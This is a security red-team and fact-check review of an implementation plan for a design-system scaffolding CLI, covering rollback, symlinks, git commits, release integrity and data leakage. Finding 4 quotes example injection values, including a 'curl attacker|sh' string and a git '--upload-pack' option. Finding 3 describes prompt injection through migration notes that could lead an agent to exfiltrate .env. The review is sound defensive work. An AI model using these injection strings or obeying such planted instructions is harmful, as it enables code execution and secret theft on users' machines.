# Red-team review — security adversary / fact checker

Plan: `plans/260804-1648-story-cli-kit-implementation/` (plan.md + phase-01..10)
Reviewer lens: attacker mindset against a CLI that writes to users' filesystems; verification role: fact checker.
Date: 2026-08-04

---

## Finding 1: The rollback ledger deletes files it overwrote but did not create

- **Severity:** Critical
- **Location:** Phase 6, "Architecture" (rollback ledger) and "Requirements — Functional — `create`"
- **Flaw:** The ledger is defined as "every path it creates" and rollback "removes exactly what was created". Nothing in the plan distinguishes *created a new file* from *wrote over a file that already existed*. The only gate is "target empty or safe" (phase-06:24), and "safe" is never defined anywhere in the plan or in `docs/`.
- **Failure scenario:** User runs `create` in an existing project directory — a case `requirements.md:46` explicitly declares supported ("the current directory... all three are expected and equally supported"). The directory already contains `README.md`, `.gitignore`, `tsconfig.json`, `src/styles/globals.css`. The copy stage writes the template's versions over them and appends all four to the ledger. The user then hits Ctrl-C at the package-manager prompt. Rollback walks the ledger in reverse and **deletes the user's four original files**, which no longer exist anywhere — the copy destroyed them and `git init` has not run yet (order is `gates → prompts → copy → ... → git init`, phase-06:53). The plan's own risk section calls this "the worst outcome available anywhere in this toolkit" (phase-06:98) and then mitigates only against *recursive delete of the target*, which is not the mechanism that loses the data here.
- **Evidence:**
  - `phase-06-ds-create-and-ds-generate.md:24` — "Prerequisite gates before any write: Node ≥ 24.12, git present, **target empty or safe**"
  - `phase-06-ds-create-and-ds-generate.md:49` — "The apply stage appends every path it creates. Cancel or failure walks that list in reverse and removes exactly what was created — never a recursive delete of the target, which would take the user's files with it if the target was not empty."
  - `phase-06-ds-create-and-ds-generate.md:53` — order places `copy` before `git init`
  - `docs/requirements.md:46` — "The target may be the current directory, a new subdirectory, or a nested path inside an existing repository — all three are expected and equally supported."
- **Suggested fix:** Define "safe" as a hard requirement in the phase: every template write must be `O_EXCL` (fail if the destination exists) and the whole classification must be computed and confirmed *before* any write, exactly as `adopt` already requires (ADR-013 / phase-09:15). The ledger must record `{path, action: "created" | "overwrote", backupRef}` and rollback must only unlink `created` entries. Add a success criterion: "create into a directory containing a file at a template path is refused, or reclassified through the `adopt` path — never silently overwritten."

---

## Finding 2: No path confinement — symlinks, `..`, `/` and `~` are all unaddressed

- **Severity:** High
- **Location:** Phase 6, "Requirements" (target resolution) and "Architecture" (rollback); Phase 9, "Related Code Files"
- **Flaw:** The target is "resolved to an absolute path and shown for confirmation" (phase-06:23) and that is the entire safety story. There is no requirement to `realpath` the target, to refuse a target that is `/`, `$HOME`, or a parent of the current working directory, to refuse a target containing a symlinked ancestor, or to assert that every write and every rollback unlink resolves *under* the confirmed target root.
- **Failure scenario:** Two concrete ones.
  (a) A user's target directory contains `src -> /Users/me/company-monorepo/src` (a common convenience symlink). `create` copies `src/components/**` through the symlink, writing into the monorepo, and the ledger records paths under `<target>/src/...`. On cancel, rollback unlinks through the same symlink and deletes files in the monorepo. The "never a recursive delete of the target" guard is irrelevant — every deletion is an individually-recorded path.
  (b) A user accepts the default at the target prompt without reading and gets `~`. `create` writes `package.json`, `tsconfig.json`, `.gitignore`, `README.md` into the home directory, then `git init` runs there. Nothing in the plan blocks this; the confirmation prompt is the only control and it is precisely the control a non-technical user (the stated audience, `requirements.md:89`) will click through.
- **Evidence:**
  - `phase-06-ds-create-and-ds-generate.md:23` — "The install target is resolved to an absolute path and shown for confirmation before anything is written (FR1)" — the only stated control
  - `phase-06-ds-create-and-ds-generate.md:85-94` — full success-criteria list; no symlink case, no dangerous-target case
  - `phase-06-ds-create-and-ds-generate.md:49` — rollback removes recorded paths with no containment assertion
- **Suggested fix:** Add to Phase 6 requirements: resolve with `realpath` on the deepest existing ancestor; refuse `/`, `$HOME`, and any path that is an ancestor of `process.cwd()`; refuse a target whose ancestry crosses a symlink; and make every write and every unlink assert `resolved.startsWith(targetRoot + sep)` at the point of the syscall, not at planning time. Use `lstat`, not `stat`. Add a symlinked-`src` fixture to the rollback tests.

---

## Finding 3: `--on-conflict=migrate` hands a user's repository to an agent with no defined interface, scope, or trust boundary

- **Severity:** Critical
- **Location:** Phase 7, "Requirements — Functional" and "The blocking gap"
- **Flaw:** The plan states "`migrate`: hand each conflicted file to an agent with the release's notes" (phase-07:38) and never defines *which agent*, *how it is invoked*, *what filesystem access it gets*, *whether its output is reviewed before being written*, or *what happens if it writes outside the conflicted file*. The plan's Open Question 1 is scoped entirely to "where do the old bytes come from" — it treats a missing input as the blocker and treats the entire agent execution boundary as already settled. It is not settled anywhere: `docs/update-and-migration.md:63-75` specifies the four *inputs* and one *reporting* obligation ("may not change a file's public export surface without recording it in the report") and nothing about isolation or verification.
- **Failure scenario:** Prompt injection with write access. Phase 7's own recommended resolution of Open Question 1 is "**Fetch the old tag at migrate time.** `git archive` or a tarball fetch" (phase-07:23). That makes the migration notes and the old file content *remotely-fetched, mutable content* (see Finding 5 — tags are mutable) that is then placed verbatim into an agent's context as authoritative instruction: the plan itself says "The rationale is not documentation courtesy — it is the **input** that lets an agent decide whether a user's local modification still makes sense" (phase-07:57). A `migrations/2.0.0.md` containing an instruction block rather than a rationale directs the agent to modify files outside the conflicted set, exfiltrate `.env`, or rewrite `.designsystem/manifest.json` so the next `update` reclassifies everything as unmodified and overwrites it. The branch-isolation defence (phase-07:55) protects tracked-file *recovery*; it does nothing about reading secrets or writing untracked files.
- **Evidence:**
  - `phase-07-ds-update.md:38` — "`migrate`: hand each conflicted file to an agent with the release's notes; per-file and independent"
  - `phase-07-ds-update.md:23` — "Fetch the old tag at migrate time. `git archive` or a tarball fetch of `story-cli-kit@<manifest.engineVersion>`, into a temp directory."
  - `phase-07-ds-update.md:57` — notes rationale is "the input that lets an agent decide"
  - `docs/update-and-migration.md:69-75` — "Safety invariants ... **and they apply to `migrate` in particular**" — five invariants, none of which constrain the agent's filesystem scope
  - `phase-07-ds-update.md:64-70` — Related Code Files lists `pipeline.ts`, `report.ts`, `baseline.ts`; **no module for agent invocation exists in the plan at all**
- **Suggested fix:** Promote this to Open Question 0, ahead of the old-bytes question. Specify: the agent operates on a single file's content passed as data, not on the working tree; its output is a proposed replacement returned to `ds`, which writes it (so `ds` remains the only writer and the confinement rule from Finding 2 applies); migration notes are rendered into the prompt inside an explicit untrusted-content delimiter and the invocation states that notes are reference material, not instructions; `ds` diffs the returned content and refuses any change to the file's export surface unless recorded (making `update-and-migration.md:74` a mechanism rather than an expectation). Add `packages/engine/src/update/agent.ts` to Related Code Files.

---

## Finding 4: `manifest.json` and `--to <version>` are trusted inputs feeding git refs and remote fetches

- **Severity:** High
- **Location:** Phase 7, "The blocking gap" and "Requirements — Functional"; Phase 8, "Requirements"
- **Flaw:** `.designsystem/manifest.json` is a file inside a repository the user may have cloned from anywhere, yet the plan treats its contents as trustworthy. `manifest.engineVersion` is interpolated directly into a remote fetch (`story-cli-kit@<manifest.engineVersion>`, phase-07:23). `--to <version>` is interpolated into a git branch name (`ds-update/<version>`, phase-07:34-35) and into "resolution against git tags" (phase-07:82). Phase 8 does the same with `ds-migrate/<name>` (phase-08:24) and records applied migration ids into the manifest (phase-08:63), then reads them back. No phase requires schema validation of the manifest on read, and none requires validating a version string against a semver grammar or a ref-name grammar before it reaches git.
- **Failure scenario:** A contributor clones a design-system repo whose `manifest.json` has been tampered with (or simply corrupted by a bad merge) and runs `ds update`. `engineVersion` is `--upload-pack=/tmp/x` or `v1.0.0; curl attacker|sh` or `../../../../etc`. Depending on how the fetch is spawned, this is git argument injection, shell injection, or a fetch of an attacker-chosen ref that then supplies the "old shipped version" and migration notes consumed by Finding 3's agent. Independently, a `<version>` containing `..` or `/` produces a branch name git rejects — surfacing as a raw git error, violating NFR5's "a stack trace reaching the user is a bug" (`requirements.md:102`). The manifest is also the file that Phase 7 relies on for `adopt`-merged markings (phase-07:42); a tampered manifest that removes those marks makes `update` rewrite files it promised never to rewrite (ADR-013, `docs/architecture.md:272`).
- **Evidence:**
  - `phase-07-ds-update.md:23` — `story-cli-kit@<manifest.engineVersion>` interpolation
  - `phase-07-ds-update.md:34-35` — "`ds update [--to <version>] ...` ... create branch `ds-update/<version>`"
  - `phase-07-ds-update.md:82` — "`--to <version>` resolution against git tags"
  - `phase-07-ds-update.md:42` — "**Files merged by `adopt` are reported and never rewritten** (ADR-013) — the manifest marks them, and this pipeline must honour the mark"
  - `docs/architecture.md:56-68` — manifest format; no version/schema field beyond `engineVersion`, no integrity
- **Suggested fix:** Add a `manifest/read.ts` requirement in Phase 7: parse against an explicit schema, reject unknown shapes with an `ActionableError`, and validate `engineVersion` and any `--to` value against a strict semver regex before either reaches git or a filesystem path. Spawn git and the package manager with an argv array and no shell, and never pass a user- or manifest-derived string as the first token of an argument that git may interpret as an option (prefix with `--` where possible). Add a fixture with a hostile manifest to the Phase 7 test matrix.

---

## Finding 5: Mutable git tags are the release mechanism, with no integrity pin and no decision on repository visibility

- **Severity:** High
- **Location:** Phase 10, "Architecture" and "Success Criteria"
- **Flaw:** `#semver:^1.0.0` against git tags is the distribution channel for both `npx` scaffolding and every generated project's devDependency. Git tags are mutable and force-pushable; npm registry versions are not. The plan contains no requirement for signed tags, protected tags, a release-integrity check, or any pinning story, and it never decides whether the GitHub repository is public or private — which determines whether an unauthenticated `npx` works at all and whether the repository contents (Finding 8) become world-readable. There is currently no `git remote` configured in this clone, so the target repository does not yet exist and its visibility is an unmade decision, not a recorded one.
- **Failure scenario:** Two paths, both ending in code execution on the maintainer's machines.
  (a) A tag rewrite. Anyone who obtains push access (leaked PAT, compromised CI token, a stolen laptop) force-pushes `v1.4.0` to a malicious commit. Every `npx github:joachimtrungtuan/story-cli-kit create` and every fresh `npm install` in a generated project without a committed lockfile resolves the tag afresh and executes the new code. `ds` writes to the filesystem by design and Storybook loads the preset from `node_modules` on every boot (`docs/architecture.md:44`, phase-04:19-21), so the payload runs in two independent places. There is no `integrity` hash for git dependencies to catch this.
  (b) Namespace reuse. The dependency specifier `github:joachimtrungtuan/story-cli-kit` is a *name*, not a hash. If the account is ever renamed or the repository transferred/deleted, the namespace is claimable and every generated project's dependency silently repoints. Phase 10's own success criterion **"a newly published tag is picked up by an install"** (phase-10:70) is a test that remote mutation reaches user projects — it verifies the attack works.
- **Evidence:**
  - `phase-10-release-ci-and-distribution.md:22` — "a generated project depends on `github:joachimtrungtuan/story-cli-kit#semver:^1.0.0`, not a pinned commit (ADR-007)"
  - `phase-10-release-ci-and-distribution.md:35` — "the tag *is* the release"
  - `phase-10-release-ci-and-distribution.md:70` — "a newly published tag is picked up"
  - `docs/architecture.md:167` — ADR-007, "Semver ranges work on git dependencies via `#semver:^1.0.0` — npm matches tags in the remote much as it would a registry range"
  - `docs/architecture.md:44` — the preset is loaded from `node_modules` on every Storybook boot
  - Verified: `git remote -v` in the repository root returns nothing — the distribution target does not exist yet
- **Suggested fix:** Add to Phase 10 requirements: repository visibility decided and recorded as an ADR amendment (public is required for the "clean machine, only Node and npm" criterion at phase-10:21); GitHub protected tags / tag-immutability enabled; releases tagged with signed tags and the release checklist in `docs/releasing.md` requiring signature verification; and an explicit statement that generated projects **must** commit their lockfile so the resolved commit SHA is pinned after first install. Add a success criterion that a rewritten tag is detected rather than silently consumed.

---

## Finding 6: `create` commits into the user's existing repository with no clean-tree gate and no defined staging scope

- **Severity:** High
- **Location:** Phase 6, "Requirements — Functional — `create`" (git handling) and "Implementation Steps" step 5
- **Flaw:** ADR-009 mandates that `create` "runs `git init` and makes one initial commit containing the scaffold", and ADR-009 also makes "use the enclosing repository" the **default** when the target sits inside an existing repo. Those two combine into "make a commit in a repository the user already owns and is probably mid-work in". Phase 6 reproduces both requirements (phase-06:26-27) and step 5 says only "Git handling: `init`, initial commit, and the nested-repository branch" (phase-06:76). Nothing states what is staged, that the enclosing tree must be clean first, or that staging is restricted to paths under the target.
- **Failure scenario:** A developer with uncommitted work across their app repo runs `create` into `design-system/`, presses enter at the git-ancestry prompt (the documented default), and `create` stages and commits. If staging is `git add -A` or `git add .` from the repo root, the commit sweeps up their half-finished refactor and any untracked file the repo's `.gitignore` does not cover — routinely including `.env.local`, `*.pem`, or a scratch credentials file. That commit now exists in history, and if it is pushed the secret is disclosed. `docs/code-standards.md:74` forbids committing `.env` for this repository's own work but nothing carries that rule into the tool's behaviour toward user repositories, and NFR1's reversibility guarantee is about *our* writes, not about the user's unrelated staged work. This is the mirror image of ADR-010's own stated principle: "Rewriting configuration the user owns, in a repository we were invited into, is a larger liberty than the convenience is worth" (`docs/architecture.md:215`) — writing *history* the user owns is a larger liberty still, and the plan grants it without a gate.
- **Evidence:**
  - `docs/architecture.md:194` — "`create` runs `git init` and makes one initial commit containing the scaffold"
  - `docs/architecture.md:200` — "Using the enclosing repository is the default"
  - `phase-06-ds-create-and-ds-generate.md:26-27` — both requirements restated, staging unspecified
  - `phase-06-ds-create-and-ds-generate.md:76` — "Git handling: `init`, initial commit, and the nested-repository branch including the printed parent instruction"
  - `phase-06-ds-create-and-ds-generate.md:85-94` — no success criterion covers what the commit contains in the enclosing-repository case
  - `docs/architecture.md:215` — the ADR-010 principle this violates
- **Suggested fix:** Add explicit Phase 6 requirements: in the enclosing-repository branch, refuse unless the enclosing tree is clean (or offer to commit only pathspec-scoped changes); stage with an explicit pathspec limited to the target directory (`git add -- <target>`), never `-A` / `.`; never `git add -f`; and print the exact file list being committed before committing. Add a success criterion: "`create` into a subdirectory of a repository with unrelated dirty files commits only files under the target, verified by `git show --stat`."

---

## Finding 7: Project name and target path reach `package.json` templating and the package-manager subprocess unvalidated

- **Severity:** High
- **Location:** Phase 5, "Related Code Files" (`{{placeholders}}`); Phase 6, "Implementation Steps" step 6 (`install.ts`)
- **Flaw:** The template ships `package.json` "with `{{placeholders}}` for name and package-manager scripts" (phase-05:81), and Phase 6 spawns the detected package manager (phase-06:77). Phase 6 requires name validation for `generate` — "Refuses an unknown tier and a name that would violate the naming rules, with the rule quoted" (phase-06:36) — and requires nothing equivalent for the project name in `create`. Placeholder substitution into a JSON file is textual by construction; nothing states the value is JSON-encoded rather than pasted.
- **Failure scenario:** Three tiers of the same omission.
  (a) A project name containing a double quote or backslash — trivially typed on a non-US keyboard, or produced by a directory name like `Client "Acme" DS` — produces syntactically invalid `package.json`. `install.ts` then fails with a raw npm parse error, breaching NFR5 (`requirements.md:102`, "A stack trace reaching the user is a bug"), and it fails *after* `git init` and the commit, so the user is left with a committed broken project.
  (b) A name containing `",​"scripts":{"preinstall":"…` injects arbitrary JSON keys — including lifecycle scripts — into the generated manifest, which the very next step executes via `npm install`.
  (c) If `install.ts` composes a command string rather than an argv array (unspecified in the plan), the target path — which contains user-controlled directory names, and in this maintainer's own working tree both spaces and non-ASCII characters — is a shell-injection and quoting hazard on the command line.
- **Evidence:**
  - `phase-05-neutral-template.md:81` — "Create: `templates/storybook-vite/package.json` — with `{{placeholders}}` for name and package-manager scripts"
  - `phase-06-ds-create-and-ds-generate.md:36` — name validation required for `generate` only
  - `phase-06-ds-create-and-ds-generate.md:64,77` — `install.ts` "package-manager invocation, streamed output"; no argv/shell statement
  - `docs/requirements.md:102` — NFR5, "A stack trace reaching the user is a bug"
- **Suggested fix:** Add to Phase 6: validate the project name against the npm package-name grammar before any write, with an `ActionableError` quoting the rule (mirroring the `generate` requirement); produce `package.json` by mutating a parsed object and re-serialising, never by string substitution into JSON; spawn the package manager with `spawn(cmd, argsArray, { shell: false })` and add a success criterion covering a target path containing spaces and non-ASCII characters.

---

## Finding 8: The plan commits a client's brand token system into the repository that must become publicly installable, and the stated `files` field cannot exclude it

- **Severity:** High
- **Location:** Phase 2, "Related Code Files" and "Implementation Steps" step 3; Phase 10, "Requirements" and "Success Criteria"
- **Flaw:** Phase 2 puts WIN Flavor's real token data into committed engine fixtures — "`__fixtures__/` — valid and invalid token files, **including the WIN Flavor ramps as a real-world case**" (phase-02:55) and "Fixtures taken from `win-ui-layout`" (phase-02:62). Phase 5's success criterion says the opposite for the template — "No WIN Flavor brand value, asset or copy survives anywhere in the tree" (phase-05:114) — so the plan contradicts itself about whether client brand data lives in this repo. Separately, Phase 10 requires "`package.json#files` ships `packages/` and `templates/` and nothing else — no fixtures, no tests, no plans" (phase-10:23) with the matching success criterion at phase-10:67. That is not achievable with the stated mechanism: npm's `files` array includes a named directory **recursively**; `["packages", "templates"]` ships every `__fixtures__` and `*.test.ts` under them.
- **Failure scenario:** The repository must be public for `npx github:...` to work on a clean machine with no credentials (phase-10:21, and Finding 5). Publishing it exports the fixtures. The reference `tokens.json` is not just colours: its `meta` group records **"WIN Flavor Brand Guidelines PDF (2024-05) — web-specific interpretation"** plus an internal project phase label. A client's brand system and the provenance of their confidential brand guidelines end up in a public repository and in every generated project's `node_modules` — including projects for *other* clients, since ADR-007 accepts that "a generated project's dependency carries the CLI and templates alongside the engine" (`docs/architecture.md:174`). Phase 9 makes it worse: its fixtures are whole applications — "a compliant Vite+Tailwind4 app, a Tailwind v3 app, a Next.js app, a CRA app" (phase-09:62) — all shipped in the tarball under the same rule.
- **Evidence:**
  - `phase-02-token-engine-schema-ramps-codegen.md:55` — "including the WIN Flavor ramps as a real-world case"
  - `phase-02-token-engine-schema-ramps-codegen.md:62` — "Fixtures taken from `win-ui-layout`"
  - `phase-05-neutral-template.md:114` — "No WIN Flavor brand value, asset or copy survives anywhere in the tree"
  - `phase-10-release-ci-and-distribution.md:23` and `:67` — the `files` requirement and its unachievable success criterion
  - Verified in the reference project's `tokens.json`: `meta.source` = `"WIN Flavor Brand Guidelines PDF (2024-05) — web-specific interpretation"`, `meta.phase` = `"02 — Token Foundation And Storybook Theming"`
  - `docs/architecture.md:174` — the whole artifact ships into every generated project
- **Suggested fix:** Decide and record whether client brand data may live in this repository at all. If the fixtures are needed, neutralise them at authoring time (keep the *shapes* — anchor 950 and anchor 500 — with invented hex values) rather than lifting the client file, and never copy `meta`. Independently, correct Phase 10: `files` must use explicit negation (`"!packages/**/__fixtures__"`, `"!packages/**/*.test.ts"`) or the fixtures must live outside `packages/`, and the success criterion must be checked with an actual `npm pack --dry-run` file listing, not assumed.

---

## Finding 9: `update` and `adopt` write committed reports whose content and path scope are never specified

- **Severity:** Medium
- **Location:** Phase 7, "Requirements — Functional" (report); Phase 9, "Architecture" ("The report is a project artefact")
- **Flaw:** Both commands leave a durable, in-repository report — Phase 7 writes `update-logs/<date>/NN-engine-update-<version>.md` "listing every file by category, every conflict and its resolution, every validator failure" (phase-07:40); Phase 9 leaves "a written record of every path and its classification" and insists it is "a project artefact, not console output" (phase-09:44, :53). Neither phase specifies that paths are repository-relative, that file *content* is excluded, or that validator/gate output is sanitised. Phase 9's `merge` class is defined as "merged, **additions listed line by line**" (phase-09:32), so content does land in the report by design.
- **Failure scenario:** `adopt` runs against a real application. Its `package.json` merger reads the existing manifest, which routinely contains private registry hosts, internal scoped package names, and repository URLs; its gate output records detected versions; classification enumerates the user's entire component tree. All of it is written into a committed markdown file and, if paths are absolute (the plan resolves targets to absolute paths, phase-06:23), the file embeds the local username and directory layout. The result is a committed artefact that discloses internal package infrastructure and the shape of a client codebase — from a tool whose stated purpose is to be run across multiple client projects in parallel (`requirements.md:31`).
- **Evidence:**
  - `phase-07-ds-update.md:40` — report contents enumerated, no scoping rule
  - `phase-09-ds-adopt.md:32` — "merged, additions listed line by line"
  - `phase-09-ds-adopt.md:53` — "The report is a project artefact, not console output ... it should still be readable in six months"
  - `docs/architecture.md:274` — ADR-013, "`adopt` leaves a report of every path and its classification in the project"
  - `phase-06-ds-create-and-ds-generate.md:23` — targets are resolved to absolute paths
- **Suggested fix:** Add a requirement to both phases: reports record repository-relative paths only; they name files and classes but never embed file content beyond the specific keys/lines a merger added; dependency-merge entries record package names and ranges, not registry URLs or auth-bearing values; and a test asserts no absolute path and no `$HOME` fragment appears in a generated report.

---

## Finding 10: Validator rules 16–18 have no ramp discriminator, and the reference project proves the ambiguous case exists

- **Severity:** Medium
- **Location:** Phase 3, "Requirements" (rules 16–18) and "Risk Assessment"; Phase 5, "What mirroring actually involves" row 4
- **Flaw:** Phase 3 implements rules 16 ("Every ramp declares `$base`, `$anchor`, `$mode`"), 17 (anchor fidelity) and 18 (no twelve literal steps) by delegating to Phase 2's schema module (phase-03:47). All three presuppose a machine-decidable answer to "is this token a ramp?" — and neither the contract nor any phase defines one. Phase 3's risk section names rules 12 and 14 as the ambiguity candidates (phase-03:105) and does not name 16–18, so the plan does not know this gap exists.
- **Failure scenario:** The contract asserts `color.brand.*` are "named brand colours, **each** declared as a ramp" (`docs/design-system-contract.md:90`). The reference project falsifies this: `color.brand.white` is `{"value": "#FFFFFF", "comment": ...}` — a flat token under `color.brand.*` with no `anchorStep` and no scale. `color.grey.*` is a five-entry scale keyed `20/40/60/80/90`, not the 50–950 twelve-step shape the contract's ramp rules assume. So a validator that treats every `color.brand.*` entry as a ramp fails the template on `white`; one that treats "has a scale-like object" as a ramp misses a ramp that a user wrote with only some steps; one that treats "has `$base`" as a ramp makes rule 16 vacuous — a ramp missing `$base` is simply not a ramp and passes. Phase 5 will hit this on day one of the token translation (phase-05:26) and the plan's own prohibition applies: "Do not resolve by narrowing the rule until it passes: that is the prohibited move" (phase-03:105).
- **Evidence:**
  - `docs/design-system-contract.md:90` — "`color.brand.*` named brand colours, each declared as a ramp (below)"
  - `docs/design-system-contract.md:118-120` — the three ramp `[V]` rules, all beginning "Every ramp" / "No ramp"
  - `phase-03-validator.md:38-40` — rules 16–18 restated; `:47` delegates them to Phase 2
  - `phase-03-validator.md:105` — ambiguity risk names only rules 12 and 14
  - Verified in the reference `tokens.json`: `color.brand.white` = `{"value":"#FFFFFF","comment":"Utility white — not a brand bg color; use beige for brand surfaces"}`; `color.grey` keys are `20,40,60,80,90`
- **Suggested fix:** Add to Phase 2 a required, explicit ramp discriminator in the schema (e.g. presence of any `$`-prefixed directive marks a ramp, and a `color.*` entry with `$`-directives *and* a missing `$mode` is a rule-16 violation rather than "not a ramp"), and add it to `docs/design-system-contract.md` in the same change per the contract/validator/template co-change rule. Add a Phase 3 success criterion covering a flat colour under `color.brand.*` and a non-50–950 neutral scale.

---

## Fact Checker verification table

**Claims sampled: 24 — Verified: 19 — Failed: 4 — Partial/unverified: 1**

| # | Claim | Location | Result |
|---|---|---|---|
| 1 | "thirteen ADRs all decided" | plan.md:15 | **VERIFIED** — `grep -c "^### ADR-" docs/architecture.md` → 13 |
| 2 | "`packages/` and `templates/` hold responsibility READMEs and no code" | plan.md:15 | **VERIFIED** — only `packages/{cli,engine}/README.md`, `templates/storybook-vite/README.md` exist |
| 3 | Atoms grouped by category: `atoms/button/Button.tsx`, `atoms/misc/{Badge,Container,SlidingNumber}.tsx` | plan.md:28 | **VERIFIED** — exact match in reference `src/components/atoms/` |
| 4 | "organisms are flat files" | plan.md:28 | **VERIFIED** — `organisms/{Footer,Header,Sidebar}.tsx` + `index.ts`, no subdirectories |
| 5 | "it ships one foundations MDX" | plan.md:28 | **VERIFIED** — `src/stories/foundations/` contains only `BrandSystem.mdx` |
| 6 | "it has no `templates/` story directory" | plan.md:28 | **VERIFIED** — `src/stories/` = `Introduction.mdx, atoms, foundations, molecules, organisms, pages` |
| 7 | "`tokens.json` materialises twelve-step ramps that the contract forbids" | plan.md:28 vs contract:120 | **VERIFIED** — each brand ramp is `{value, anchorStep, scale{50..950}}` |
| 8 | "carries a `tailwind.config.ts` that ADR-003 bans outright" | plan.md:28 | **VERIFIED** — file present at reference root; `docs/architecture.md:111` "No `tailwind.config.ts` in the template" |
| 9 | "`win-ui-layout` ships `icon`, `breakpoint` and `container` groups" | plan.md:122 | **PARTIAL** — all three verified, but the enumeration is incomplete: top-level keys are `color, typography, icon, spacing, borderRadius, shadow, transition, breakpoint, container, zIndex, meta`. **`zIndex` and `meta` are also absent from the contract's list (`design-system-contract.md:88-97`) and Open Question 2 does not mention them** |
| 10 | "`borderRadius` vs the contract's `radius`, `transition` vs `motion`" | plan.md:122 | **VERIFIED** — keys `borderRadius`/`transition`; contract:96 `radius.*, shadow.*, motion.*` |
| 11 | Reference deps: `motion`, `embla-carousel-react`, `@splidejs/react-splide`, `react-router-dom`, `react-use-measure`, `lenis`, `@phosphor-icons/react` | plan.md:123 | **VERIFIED** — all seven present (plus `embla-carousel-autoplay`, `@splidejs/splide`) |
| 12 | "The contract's validation section names a pnpm script" | plan.md:124 | **VERIFIED** — `design-system-contract.md:148` "`pnpm ds:validate` runs every **[V]** rule" |
| 13 | "`cal-poly-green` at anchor 950 and `yellow-green` at anchor 500, the two cases the contract names" | phase-02:62 | **VERIFIED** — `anchorStep` `"950"` / `"500"`; `design-system-contract.md:124` names both |
| 14 | "All 23 rules" / the `[V]` list is one-to-one with the contract | phase-03:21-46, :101 | **VERIFIED** — 23 `**[V]**` markers in `design-system-contract.md` (lines 37,38,50,55-59,65,69,71,77-80,99,118-120,134,135,141,142) |
| 15 | Reference "hardcodes hex values in `preview.tsx`" and "string-matches them at runtime to decide light or dark" | phase-04:41,54 | **VERIFIED** — `preview.tsx:17-18` compares `normalized === "#212121" \|\| "#12472b"`; `:51-54` literal background hexes |
| 16 | "preview wraps stories in `MemoryRouter`, a `SurfaceProvider` and a devtools toolbar" | phase-04:56 | **VERIFIED** — `preview.tsx:2-4, 30-35, 40` |
| 17 | "`color.semantic.*` as raw hex with a `comment` reading '→ brand.jet'" | phase-05:27 | **VERIFIED** — `text-primary: {"value":"#2A2A2A","comment":"→ brand.jet"}` |
| 18 | "fourteen font-size entries and a `type-scale.ts` helper beside its typography atoms" | phase-05:73 | **VERIFIED** — 14 entries under `typography["font-size"]`; `atoms/typography/type-scale.ts` exists |
| 19 | "the contract explicitly permits a grouped `Cards.stories.tsx`" | phase-05:65 | **VERIFIED** — `design-system-contract.md:67` |
| 20 | "`update-and-migration.md` requires handing the agent ... the old shipped version" | phase-07:19 | **VERIFIED** — `docs/update-and-migration.md:63` |
| 21 | "no `prepare` build hook (ADR-012)" | phase-10:30 | **VERIFIED** — `docs/architecture.md:236`; `update-logs/2026-08-04/10-no-build-step.md` |
| 22 | Plan's architecture sketch: "`package.json` … no build step (ADR-012)" as a faithful restatement of `docs/architecture.md` | plan.md:71-72 | **FAILED** — `docs/architecture.md:8` still reads "the single installable artifact — bin: ds, **built bundle**" and `:17` "built into one bundle with the engine inlined". Update-log 10 claims "ADR-007's 'built bundle' language corrected"; the Repository-shape section was missed. The plan silently adopts the corrected reading and schedules no fix beyond a generic "final docs sync" (phase-10:61). An implementer reading `architecture.md` top-down builds a bundle |
| 23 | "Create: `package.json` — name `story-cli-kit`, `bin`, `imports`, `files`, `engines`" | phase-01:55 | **FAILED** — a root `package.json` already exists (`name: "design-system-storybook"`, `private: true`). This is a *modify* with a package rename, not a create; `private: true` must also be removed or nothing installs. Neither is stated |
| 24 | "Everything about this phase is governed by a single sentence in **FR6**: a scaffold that ends by telling the user to go and install dependencies has not finished" | phase-06:15 | **FAILED** — that sentence is in **FR1 — Initialize** (`docs/requirements.md:44`), not FR6 (`:74`). Phase 6's other FR citations (`:21`→FR6 `requirements.md:83`, `:23`→FR1 `:46`) are correct, so this is a misattribution of the phase's stated governing requirement |

### Failures, restated

- `plan.md:71-72` vs `docs/architecture.md:8,17` — stale "built bundle" language in the doc the plan claims to implement; not listed as a doc-sync item.
- `phase-01:55` — root `package.json` exists and is `private: true`; listed as "Create", and the rename `design-system-storybook` → `story-cli-kit` is unstated.
- `phase-06:15` — the phase's stated governing requirement is attributed to FR6; it is FR1.
- `plan.md:122` (partial) — Open Question 2 enumerates three unlisted token groups; there are five (`icon`, `breakpoint`, `container`, `zIndex`, `meta`). Two of the five will be discovered mid-Phase-5, which is exactly the rewrite the phase's step 1 exists to prevent.

### Unresolved questions for the maintainer

1. Is the GitHub repository public or private, and may client-derived fixture data be committed to it (Findings 5, 8)?
2. What is the agent-invocation interface for `--on-conflict=migrate`, and what filesystem scope does that agent get (Finding 3)?
3. Does `create` into a non-empty directory overwrite, refuse, or route to `adopt` (Finding 1)?
4. What discriminates a ramp from a flat colour token for validator rules 16–18 (Finding 10)?
